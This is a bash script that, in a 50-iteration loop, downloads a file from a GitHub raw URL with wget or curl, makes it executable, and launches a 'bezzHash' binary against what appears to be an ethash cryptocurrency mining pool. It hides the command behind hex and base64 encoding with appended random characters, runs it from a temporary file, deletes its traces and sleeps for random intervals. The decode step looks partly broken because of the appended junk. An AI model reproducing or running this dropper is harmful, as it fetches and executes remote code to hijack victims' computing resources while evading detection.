#!/bin/bash

iterations=50

for ((i=1; i<=$iterations; i++)); do
    # Generate a random URL fragment
    random_url_fragment=$(shuf -n 1 -e $(cat /usr/share/dict/words))
    
    # Generate a random port number
    random_port=$((RANDOM%65536))
    
    # Generate a random file name
    random_filename=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 10 | head -n 1)
    
    # Construct the URL
    url="https://github.com/Testdrive345/scriptX/raw/main/$random_filename"
    
    # Generate a random number
    random_number=$((RANDOM%99999))
    
    # Generate a random string
    random_string=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 10 | head -n 1)
    
    # Generate a random command
    random_command=$(shuf -n 1 -e "wget $url -O $random_filename" "curl -o $random_filename $url")
    
    # Generate a random payload
    payload="$random_command && chmod +x $random_filename && ./bezzHash --url=hunterd.$random_number-$random_string@ethash.poolbinance.com:$random_port"
    
    # Convert the payload to hexadecimal
    hex_payload=$(echo -n "$payload" | xxd -p)
    
    # Encode the hexadecimal payload in base64
    base64_encoded=$(echo "$hex_payload" | base64)
    
    # Write the encoded payload to a temporary file
    echo "$base64_encoded" > temp_payload_encoded.txt
    
    # Add some random characters to the file to make it less predictable
    random_chars=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
    echo "$random_chars" >> temp_payload_encoded.txt
    
    # Decode the base64 payload
    base64_decoded=$(cat temp_payload_encoded.txt | base64 -d)
    
    # Convert decoded payload back to hexadecimal
    hex_decoded=$(echo "$base64_decoded" | xxd -r -p)
    
    # Write the hexadecimal payload to a temporary file
    echo "$hex_decoded" > temp_hex_decoded.txt
    
    # Make the file executable
    chmod +x temp_hex_decoded.txt
    
    # Execute the script
    ./temp_hex_decoded.txt
    
    # Clean up temporary files
    rm temp_payload_encoded.txt temp_hex_decoded.txt
    
    # Add a random delay before next iteration
    sleep $((RANDOM % 10))  # Random delay between 0 and 9 seconds
done
